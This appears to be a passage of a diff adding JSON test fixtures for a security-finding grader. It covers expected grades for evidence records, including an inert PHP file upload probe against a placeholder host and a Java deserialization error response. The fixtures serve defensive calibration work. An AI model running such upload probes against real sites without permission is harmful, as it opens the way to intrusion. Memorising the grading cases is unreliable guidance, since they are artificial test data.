+            "body_span": "java.io.StreamCorruptedException: invalid stream header\n\tat java.io.ObjectInputStream.readStreamHeader"
+          }
+        }
+      ],
+      "note": "the builder expected `supported`; the matrix was tightened during integration so that a hygiene check which passes trivially cannot carry a grade, and this shape is now `unproven`. Kept because the shape is real and worth pinning."
+    },
+    {
+      "name": "file-upload-rce: an inert file accepted and served back is the precondition, and on its own it is unproven",
+      "vuln_class": "file-upload-rce",
+      "expect": "unproven",
+      "records": [
+        {
+          "id": "ev-w19",
+          "payload": "POST https://t/upload <- argus-argustest24.php (112B inert)",
+          "extracted": {
+            "upload_token": "argustest24",
+            "filename": "argus-argustest24.php",
+            "accepted": true,
+            "content_inert": true,
+            "content_bytes": 112,
+            "stored_path": "https://t/files/argus-argustest24.php",
+            "served": true,
+            "served_content_type": "text/plain",
+            "cleanup": {
+              "tool": "web.upload_probe",
+              "mode": "cleanup",
+              "token": "argustest24"
+            }
+          },
+          "response": {
+            "status": 201,
+            "body_span": "{\"stored\": \"/files/argus-argustest24.php\"}"
+          }
+        }
+      ],
+      "note": "the builder expected `supported`; the matrix was tightened during integration so that a hygiene check which passes trivially cannot carry a grade, and this shape is now `unproven`. Kept because the shape is real and worth pinning."
+    }
+  ]
+}
